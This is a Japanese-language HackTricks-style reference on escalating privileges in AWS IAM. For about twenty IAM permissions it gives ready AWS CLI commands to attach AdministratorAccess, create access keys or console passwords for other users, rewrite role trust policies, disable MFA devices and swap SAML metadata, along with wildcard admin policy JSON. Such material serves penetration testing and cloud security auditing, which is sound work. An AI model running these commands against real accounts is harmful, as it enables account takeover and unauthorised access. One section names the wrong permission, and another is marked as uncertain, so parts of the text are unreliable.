# AWS - IAM特権昇格

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご覧ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## IAM

IAMについての詳細は次を参照してください：

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### `iam:CreatePolicyVersion`

**`iam:CreatePolicyVersion`**権限を持つ攻撃者は、**アクセス権を持つIAMポリシーの新しいバージョンを作成**することができます。これにより、**独自のカスタム権限**を定義することができます。新しいポリシーバージョンを作成する際には、**デフォルトバージョンとして設定する必要があります**。通常、これには`iam:SetDefaultPolicyVersion`権限が必要と思われますが、新しいポリシーバージョンを作成する際には、**`--set-as-default`**フラグを含めることができます。このフラグを使用するためには、`iam:SetDefaultPolicyVersion`権限は**必要ありません**。

この方法を悪用するための例のコマンドは次のようになります：
```bash
# Enum
aws iam list-policy-versions --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <VERSION_X>

# Exploitation
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
`policy.json`ファイルには、アカウント内の任意のリソースに対して任意のアクションを許可する**ポリシードキュメントが含まれています**。

**潜在的な影響:** すべてへの直接的な特権エスカレーション。

### `iam:SetDefaultPolicyVersion`

**`iam:SetDefaultPolicyVersion`**権限を持つ攻撃者は、**現在使用されていない既存のポリシーバージョン**を介して特権をエスカレーションさせることができる場合があります。アクセス権を持つ**ポリシー**には、**デフォルトではないバージョン**がある場合、デフォルトバージョンを他の既存バージョンに変更することができます。

{% hint style="warning" %}
**変更しているポリシー**が攻撃者に`SetDefaultPolicyVersion`権限を与えているものであり、**新しいバージョンがその権限を与えていない**場合、攻撃者はポリシーを元の状態に戻すことができません。
{% endhint %}

この方法を悪用するための例のコマンドは次のようになります：
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> \
--version-id v2
```
ここで「v2」は最も権限のあるポリシーバージョンを指します。

**潜在的な影響:** より多くの権限を付与する可能性のある別のポリシーバージョンを設定することによる間接的な特権昇格。

### `iam:CreateAccessKey`

他のユーザーに対して**`iam:CreateAccessKey`**権限を持つ攻撃者は、AWS環境内で別のユーザーに属するアクセスキーIDとシークレットアクセスキーを作成することができます（ベストプラクティスでは2つのセットが関連付けられていないことが推奨されています）。

この方法を悪用するための例のコマンドは次のようになります：
```bash
aws iam create-access-key --user-name <target_user>
```
ターゲットユーザーは、現在のユーザーよりも拡張された権限を持っています。

**潜在的な影響:** 任意のユーザーへの直接の特権昇格。

### `iam:CreateLoginProfile`

他のユーザーに対して`iam:CreateLoginProfile`権限を持つ攻撃者は、**ログインプロファイルが設定されていない任意のユーザーにログインするためのパスワード**を**作成**することができます。

この方法を悪用するための例のコマンドは次のようになります：
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
そのパスワードは、**アカウントの最小パスワード要件**を満たすことを保証します。

**潜在的な影響:** 任意のユーザーへの直接の特権昇格。

### `iam:UpdateLoginProfile`

他のユーザーに対して**`iam:UpdateLoginProfile`**権限を持つ攻撃者は、**既にログインプロファイルが設定されている**任意のユーザーのAWSコンソールへのログインに使用されるパスワードを変更することができます。

ログインプロファイルの作成と同様に、この方法を悪用するための例として、次のようなコマンドが考えられます:
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '|[3rxYGGl3@`~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'
```
そのパスワードは、**アカウントの最小パスワード要件**を満たすことを保証します。

**潜在的な影響:** 任意のユーザーに対する直接の特権昇格。

### `iam:UpdateAccessKey`

**`iam:UpdateAccessKey`**を持つ攻撃者は、**無効化されたアクセスキーを有効に**し、それを使用することができます（無効化されたアクセスキーを持っている必要があります）

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Active --user-name Bob
```
{% endcode %}

**潜在的な影響:** キーを持っている場合に、直接アクセスキーユーザーへの特権昇格が可能です。

### `iam:CreateServiceSpecificCredential`

これにより、リクエストで指定されたサービス（CodeCommitまたはAmazon Keyspaces -- Apache Cassandra--）にアクセスするために使用できる**ユーザー名**と**パスワード**を**生成**することができます。

新しいサービス固有の資格情報は、関連するユーザーと同じ権限を持っていますが、指定されたサービスにのみアクセスするために使用できます。

各サポートされているサービスごとに、ユーザーごとに**最大2つのサービス固有の資格情報セット**を持つことができます。

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name sofia --service-name codecommit.amazonaws.com
```
**潜在的な影響:** ユーザーサービスの権限への直接的な特権昇格。

### `iam:ResetServiceSpecificCredential`

**`iam:CreateServiceSpecificCredential`**と同様ですが、新しい資格情報を作成する代わりに、既存の資格情報をリセットします。
```bash
aws iam reset-service-specific-credential --service-specific-credential-id ACCAEXAMPLE123EXAMPLE
```
{% endcode %}

**潜在的な影響:** ユーザーサービスの権限への直接的な特権昇格。

### `iam:AttachUserPolicy`

**`iam:AttachUserPolicy`** 権限を持つ攻撃者は、**アクセス権を持つユーザーにポリシーを添付することで特権を昇格**させることができます。そのポリシーの権限を攻撃者に追加します。

この方法を悪用するための例のコマンドは次のようになります:
```bash
aws iam attach-user-policy --user-name <my_username> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
**潜在的な影響:** 何でも直接特権昇格が可能です。

### `iam:AttachGroupPolicy`

**`iam:AttachGroupPolicy`** 権限を持つ攻撃者は、自身が所属しているグループにポリシーを添付することで特権を昇格させることができます。そのポリシーの権限が攻撃者に追加されます。
```bash
aws iam attach-group-policy --group-name group_i_am_in \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
グループが現在のユーザーが所属しているグループである場合。

**潜在的な影響:** 直接的な特権昇格（ユーザーがグループ内にいる場合）。

### `iam:AttachRolePolicy`, `sts:AssumeRole`

**`iam:AttachRolePolicy`** 権限を持つ攻撃者は、アクセス権を持っているロールにポリシーを**アタッチすること**によって特権を昇格させることができます。そのポリシーの権限を攻撃者に追加します。
```bash
aws iam attach-role-policy --role-name <role_i_can_assume> \
--policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```
ロールは、現在のユーザーが`sts:AssumeRole`を使用して一時的にアサムできるロールです。

**潜在的な影響:** 何でも直接特権昇格します。

### `iam:PutUserPolicy`

`iam:PutUserPolicy`権限を持つ攻撃者は、アクセス権を持つユーザーのためにインラインポリシーを作成または更新することにより、特権を昇格させることができます。そのポリシーの権限を攻撃者に追加します。
```bash
aws iam put-user-policy --user-name <my_username> --policy-name "my_inline_policy" \
--policy-document "file:///path/to/administrator/policy.json"
```
次のようなポリシーを使用することができます：

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:CreatePolicyVersion",
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": "iam:SetDefaultPolicyVersion",
      "Resource": "*"
    }
  ]
}
```

このポリシーは、`iam:CreatePolicyVersion`および`iam:SetDefaultPolicyVersion`のアクションを許可します。リソースはすべてのものに対して設定されています。
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**潜在的な影響:** 何でも直接特権昇格が可能です。

### `iam:PutGroupPolicy`

`iam:PutGroupPolicy` 権限を持つ攻撃者は、**自分が所属しているグループのインラインポリシーを作成または更新することによって特権を昇格させる**ことができます。そのポリシーの権限を攻撃者に追加します。
```bash
aws iam put-group-policy --group-name <group_i_am_in> \
--policy-name "group_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
グループが**現在のユーザーが所属しているグループ**である場所。

**潜在的な影響:** 何でも直接特権昇格。

### `iam:PutRolePolicy`, `sts:AssumeRole`

**`iam:PutRolePolicy`**権限を持つ攻撃者は、**アクセス権限を持つロールのインラインポリシーを作成または更新することによって特権を昇格**させることができます。そのポリシーの権限を攻撃者に追加します。

この方法を悪用するための例のコマンドは次のようになります：
```bash
aws iam put-role-policy --role-name <role_i_can_assume> \
--policy-name "role_inline_policy" \
--policy-document file:///path/to/administrator/policy.json
```
ロールは、現在のユーザーが`sts:AssumeRole`を使用して一時的にアサムできるロールです。

**潜在的な影響:** 何でも直接特権昇格。

### `iam:AddUserToGroup`

**`iam:AddUserToGroup`**権限を持つ攻撃者は、AWSアカウントの既存のIAMグループに**自分自身を追加**するために使用することができます。
```bash
aws iam add-user-to-group --group-name <target_group> --user-name <my_username>
```
**ターゲットグループが攻撃者のユーザーアカウントよりも多く/異なる特権を持っている場合**。

**潜在的な影響:** 任意のグループへの直接特権昇格。

### `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`

`iam:UpdateAssumeRolePolicy`および`sts:AssumeRole`の権限を持つ攻撃者は、**既存のロールのアサムロールポリシードキュメントを変更**して、そのロールをアサムすることができます。
```bash
aws iam update-assume-role-policy --role-name <role_to_assume> \
--policy-document file:///path/to/assume/role/policy.json
```
以下のようなポリシーがある場合、ユーザーにはロールを仮定する権限が与えられます。
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**潜在的な影響:** 任意のロールへの直接の特権昇格。

### `iam:UploadSSHPublicKey`

`iam:DeactivateMFADevice`を持つ攻撃者は、**SSH公開鍵をアップロードし、指定されたIAMユーザーに関連付ける**ことができます（[詳細はこちら](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_UploadSSHPublicKey.html)）。

この操作によってアップロードされたSSH公開鍵は、**関連付けられたIAMユーザーのCodeCommitリポジトリへの認証にのみ使用**されます。SSHキーを使用してCodeCommitリポジトリに認証する方法の詳細については、CodeCommitユーザーガイドの[SSH接続のためのCodeCommitのセットアップ](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-credentials-ssh.html)を参照してください。
```bash
aws iam upload-ssh-public-key --user-name <value> \
--ssh-public-key-body <value>
```
**潜在的な影響:** CodeCommitへの間接的な特権昇格。

### `iam:DeactivateMFADevice`

`iam:DeactivateMFADevice`を持つ攻撃者は、指定されたMFAデバイスを**無効化**し、元々有効になっていたIAMユーザーとの関連付けを解除することができます（[詳細を学ぶ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_DeactivateMFADevice.html)）。
```bash
aws iam deactivate-mfa-device --user-name <value> --serial-number <value>
```
**潜在的な影響:** MFAデバイスを無効にすることで、ユーザーの間接的な特権昇格が可能です。

### `iam:ResyncMFADevice`

`iam:ResyncMFADevice`を持つ攻撃者は、指定されたMFAデバイスをIAMエンティティ（ユーザーまたはロール）と同期することができます（[詳細を学ぶ](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_ResyncMFADevice.html)）。
```bash
aws iam resync-mfa-device --user-name <value> --serial-number <value> \
--authentication-code1 <value> --authentication-code2 <value>
```
**潜在的な影響:** MFAデバイスを追加することで、ユーザーのユーザー名とパスワードを既に知っている場合に、ユーザーの間接的な特権昇格が可能です。

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

これらの権限を持つことで、SAML接続のXMLメタデータを変更することができます。その後、SAMLフェデレーションを悪用して、それを信頼している任意の役割で**ログイン**することができます。

なお、これを行うと**正規のユーザーはログインできなくなります**。ただし、XMLを取得できるため、自分のXMLを置いてログインし、以前の設定を戻すことができます。
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: 指定されたロールでSAMLメタデータを生成し、ログインすることができるツール
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

（不確かです）攻撃者がこれらの**権限**を持っている場合、新しい**Thumbprint**を追加して、プロバイダを信頼するすべてのロールにログインすることができます。

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* もし、あなたの**会社をハックトリックで宣伝したい**場合や、**最新版のPEASSを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆ハックトリックのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
